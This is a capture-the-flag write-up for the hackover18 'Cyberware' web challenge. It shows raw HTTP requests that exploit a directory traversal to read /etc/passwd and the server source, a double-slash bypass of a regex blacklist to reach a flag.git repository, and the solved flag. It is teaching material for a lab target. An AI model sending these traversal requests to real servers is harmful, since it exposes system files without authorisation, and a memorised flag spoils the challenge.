# Cyberware (web, 416, 24 solved)

We get access to a webpage with links to 4 ascii-art files.
If we simply click on them, we can't see the files and we get HTTP 412 response.
Once we dig a bit deeper we can see a strange header `HTTP/1.1 412 referer sucks`

Once we send a raw request with no headers, we get back a nice picture:

```python
from crypto_commons.netcat.netcat_commons import nc


def main():
    s = nc("cyberware.ctf.hackover.de", 1337)
    s.sendall("GET /fox.txt  HTTP/1.0\r\nConnection: close\r\n\r\n")
    print(s.recv(9999))
    print(s.recv(9999))
    pass


main()
```

If we look closely at the responses we can see:

```
HTTP/1.1 200 Yippie
Server: Linux/cyber
Date: Sun, 07 Oct 2018 14:50:19 GMT
Content-type: text/cyber
Content-length: 414
```

This could suggest a custom-made http server of some sort.
Once we play around a bit we notice that there is a directory traversal there:

```
s.sendall("GET ./etc/passwd  HTTP/1.0\r\nConnection: close\r\n\r\n")
```

returns contents of `/etc/passwd` for us.

Now we can get `/proc/self/cmdline` which tells us we're running `/usr/bin/python3 ./cyberserver.py`, and we can read this file to recover [server source code](cyberserver.py)

The interesting part of the code is:

```python
        if path.startswith('flag.git') or search('\\w+/flag.git', path):
            self.send_response(403, 'U NO POWER')
            self.send_header('Content-type', 'text/cyber')
            self.end_headers()
            self.wfile.write(b"Protected by Cyberware 10.1")
            return
```

This suggests there is a `flag.git` repository there!
It seems blacklisted, but `\w+` does not match `/` and they included only a single `/` in the pattern so if we send two, it will bypass the check:

```
s.sendall("GET ./home/ctf//flag.git  HTTP/1.0\r\nConnection: close\r\n\r\n")
```

We get back a nice `HTTP/1.1 406 Cyberdir not accaptable`, so we made a proper request.

Now what is left is to modify some git-repo-dumper like https://github.com/internetwache/GitTools/tree/master/Dumper to grab the contents of the git repo and there we can find the flag: `hackover18{Cyb3rw4r3_f0r_Th3_w1N}`
